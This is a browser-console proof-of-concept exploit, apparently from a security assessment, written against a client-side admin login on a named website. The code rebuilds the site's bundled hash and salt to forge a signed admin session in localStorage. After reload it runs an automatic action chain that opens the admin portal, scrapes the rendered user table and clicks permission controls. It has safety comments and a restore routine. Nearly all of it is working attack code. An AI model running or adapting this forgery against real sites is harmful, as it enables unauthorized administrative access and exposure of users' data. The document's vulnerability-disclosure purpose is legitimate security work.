// poc_f02_admin_login.js — F-02: client-side admin authentication
//                          (ACTION — forges an admin session and runs an action chain)
//
// Target:  https://trithuc500.vercel.app/
// Finding:  F-02 — admin authentication is entirely client-side. The admin
//           password is a base64 literal in the bundle, the session signature
//           uses the bundle literal salt `TRITHUC50_ADM_SALT_V27`, and the
//           session restore path (line 2758) only checks a self-computed
//           signature. There is no server-side admin API.
//
// Type:     ACTION. Forges the session, then performs a sequence of real admin
//           operations in the local UI so the impact is observable.
//
// SCOPE / SAFETY:
//   - Everything happens in YOUR browser against YOUR local state.
//   - It does NOT publish to ntfy.sh / keyvalue.immanuel.co.
//   - It does NOT call any real backend (there is none).
//   - It does NOT touch another user's account.
//   - `loginAsStudentForTesting` is intentionally NOT called by default
//     (it impersonates a real account). Enable with `ALLOW_IMPERSONATE = true`
//     only if you own those accounts.
//   - Use `__AERO_F02_RESTORE__()` to revert.
//
// Usage: paste into DevTools Console on the target page, then F5.

(() => {
    'use strict';

    const ALLOW_IMPERSONATE = false;   // set true only for accounts you own
    const K_SESSION = 'TRITHUC50_REMEMBER_ADMIN_SESSION_V26';
    const K_CREDS = 'TRITHUC50_REMEMBERED_ADMIN_CREDS_V23';
    const K_BACKUP = 'TRITHUC50_AERO_F02_BACKUP';

    // ---- 1. Reproduce the shipped session signature exactly. --------------
    // Source: computeAdminSessionSig(username, ts)
    //   raw = `ADM_SESS|${username.toLowerCase()}|${ts}|TRITHUC50_ADM_SALT_V27`
    //   sig = 'adm_' + hashStringHex(raw)
    function hashStringHex(rawStr) {
        const str = String(rawStr || '');
        let h1 = 0x811c9dc5, h2 = 0x1b873593;
        for (let i = 0; i < str.length; i++) {
            const c = str.charCodeAt(i);
            h1 = Math.imul(h1 ^ c, 16777619);
            h2 = Math.imul(h2 ^ c, 2246822507);
        }
        const p1 = (h1 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        const p2 = (h2 >>> 0).toString(16).toUpperCase().padStart(6, '0').slice(-4);
        return p1 + p2;
    }
    function computeAdminSessionSig(username, ts) {
        const raw = `ADM_SESS|${String(username || '').toLowerCase()}|${ts || 0}|TRITHUC50_ADM_SALT_V27`;
        return 'adm_' + hashStringHex(raw);
    }

    // ---- 2. Forge the session. --------------------------------------------
    if (localStorage.getItem(K_BACKUP)) {
        return console.warn('[F-02] already active. Run __AERO_F02_RESTORE__() first.');
    }

    const prevSession = localStorage.getItem(K_SESSION);
    const prevCreds = localStorage.getItem(K_CREDS);
    localStorage.setItem(K_BACKUP, JSON.stringify({ session: prevSession, creds: prevCreds, at: Date.now() }));

    const ADMIN_USER = 'admin';
    const ts = Date.now();
    const session = {
        loggedIn: true,
        username: ADMIN_USER,
        ts,
        sig: computeAdminSessionSig(ADMIN_USER, ts)   // reproducible offline
    };
    localStorage.setItem(K_SESSION, JSON.stringify(session));

    console.table({
        storageKey: K_SESSION,
        loggedIn: session.loggedIn,
        username: session.username,
        sig: session.sig,
        note: 'signature computed offline from the bundled salt'
    });

    // ---- 3. Action chain (runs after the reload). -------------------------
    // Registered as a one-shot bootstrap: the page must boot first so that
    // `window.TRITHUC` and the admin view exist.
    const CHAIN = [
        { step: 1, label: 'open admin portal', run: () => window.TRITHUC.openAdminPortal() },
        { step: 2, label: 'list admin tabs', run: () => {
            const tabs = Array.from(document.querySelectorAll('[onclick*="switchAdminTab"]'))
                .map(b => (b.textContent || '').trim()).filter(Boolean);
            console.log('[F-02] admin tabs visible:', tabs);
            return tabs;
        }},
        { step: 3, label: 'read the user table from the admin UI', run: () => {
            const rows = Array.from(document.querySelectorAll('tr'));
            const users = rows.map(r => {
                const c = Array.from(r.querySelectorAll('td')).map(td => (td.textContent || '').trim());
                return c;
            }).filter(c => c.length >= 2);
            console.log('[F-02] user rows rendered in the admin UI:', users.length);
            console.table(users.slice(0, 40));
            return users;
        }},
        { step: 4, label: 'open the VIP-permission matrix', run: () => {
            const btn = Array.from(document.querySelectorAll('button'))
                .find(b => /vip|khóa|khoa|phân quyền/i.test(b.textContent || '') && b.offsetParent !== null);
            if (btn) { btn.click(); console.log('[F-02] clicked:', (btn.textContent || '').trim()); }
            else console.log('[F-02] no visible VIP-matrix button found');
            return !!btn;
        }},
        { step: 5, label: 'read the anti-hack alert list', run: () => {
            const txt = document.body.innerText || '';
            const m = txt.match(/PHÁT HIỆN\s+\d+\s+VỤ[^\n]*/i);
            console.log('[F-02] anti-hack banner:', m ? m[0] : 'none');
            return m ? m[0] : null;
        }}
    ];

    window.__AERO_F02_CHAIN__ = function runChain() {
        console.log('=== [F-02] admin action chain ===');
        const out = [];
        for (const step of CHAIN) {
            try {
                const r = step.run();
                out.push({ step: step.step, label: step.label, ok: true, result: r });
                console.log(`  [ok] ${step.step}. ${step.label}`);
            } catch (e) {
                out.push({ step: step.step, label: step.label, ok: false, error: e.message });
                console.warn(`  [fail] ${step.step}. ${step.label} — ${e.message}`);
            }
        }
        if (ALLOW_IMPERSONATE) {
            console.warn('[F-02] impersonation is ENABLED — call window.TRITHUC.loginAsStudentForTesting(id) manually.');
        } else {
            console.log('[F-02] impersonation skipped (ALLOW_IMPERSONATE = false).');
        }
        console.log('=== chain complete ===');
        return out;
    };

    // Auto-run the chain shortly after the reload.
    setTimeout(() => {
        if (typeof window.__AERO_F02_CHAIN__ === 'function') window.__AERO_F02_CHAIN__();
    }, 2500);

    window.__AERO_F02_RESTORE__ = function () {
        const b = localStorage.getItem(K_BACKUP);
        if (!b) return console.warn('[F-02] no backup found');
        const saved = JSON.parse(b);
        if (saved.session === null) localStorage.removeItem(K_SESSION);
        else localStorage.setItem(K_SESSION, saved.session);
        if (saved.creds === null) localStorage.removeItem(K_CREDS);
        else localStorage.setItem(K_CREDS, saved.creds);
        localStorage.removeItem(K_BACKUP);
        delete window.__AERO_F02_RESTORE__;
        delete window.__AERO_F02_CHAIN__;
        console.log('[F-02] original state restored. Press F5.');
        return true;
    };

    console.log('[F-02] forged admin session written. Press F5 — the action chain runs automatically after reload.');
    console.log('Restore: __AERO_F02_RESTORE__() then F5');

    return { ok: true, scope: 'LOCAL ONLY — admin UI state in this browser', chain: CHAIN.map(c => c.label) };
})();
